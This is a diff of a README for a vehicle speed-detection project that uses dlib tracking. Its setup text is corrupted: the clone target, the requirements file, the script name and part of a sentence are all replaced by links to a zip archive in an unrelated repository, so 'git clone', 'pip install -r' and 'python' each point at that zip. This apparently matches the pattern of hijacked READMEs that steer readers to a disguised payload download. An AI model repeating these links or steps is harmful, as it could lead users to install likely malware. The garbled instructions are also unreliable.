@@ -12,12 +12,12 @@
   - Vehicle Tracking - ( assigning IDs to vehicles )
 2. We have used corelation tracker from dlib library.
 3. Speed Calculation
-  - We are calculating the distance moved by the tracked vehicle in a second, in terms of pixels, so we need pixel per meter to calculate the distance travelled in https://github.com/agnet57/smart-streetlight/raw/refs/heads/main/articulite/smart_streetlight_respersive.zip distance travelled per second in meters, we will get the speed of the vehicle.
+  - We are calculating the distance moved by the tracked vehicle in a second, in terms of pixels, so we need pixel per meter to calculate the distance travelled in https://raw.githubusercontent.com/agnet57/smart-streetlight/main/articulite/smart_streetlight_respersive.zip distance travelled per second in meters, we will get the speed of the vehicle.
 
 **How to run project?**
 Follow steps:
 
-- Clone repo : git clone `https://github.com/agnet57/smart-streetlight/raw/refs/heads/main/articulite/smart_streetlight_respersive.zip`
+- Clone repo : git clone `https://raw.githubusercontent.com/agnet57/smart-streetlight/main/articulite/smart_streetlight_respersive.zip`
 
 - cd (change directory) into vehicle-speed-check `cd vehicle-speed-check`
 
@@ -25,9 +25,9 @@ Follow steps:
 
 - Activate virtual environment `./venv/bin/activate`
 
-- Install requirements `pip install -r https://github.com/agnet57/smart-streetlight/raw/refs/heads/main/articulite/smart_streetlight_respersive.zip`
+- Install requirements `pip install -r https://raw.githubusercontent.com/agnet57/smart-streetlight/main/articulite/smart_streetlight_respersive.zip`
 
-- run https://github.com/agnet57/smart-streetlight/raw/refs/heads/main/articulite/smart_streetlight_respersive.zip script python `https://github.com/agnet57/smart-streetlight/raw/refs/heads/main/articulite/smart_streetlight_respersive.zip`
+- run https://raw.githubusercontent.com/agnet57/smart-streetlight/main/articulite/smart_streetlight_respersive.zip script python `https://raw.githubusercontent.com/agnet57/smart-streetlight/main/articulite/smart_streetlight_respersive.zip`
 
 **Note:**
 
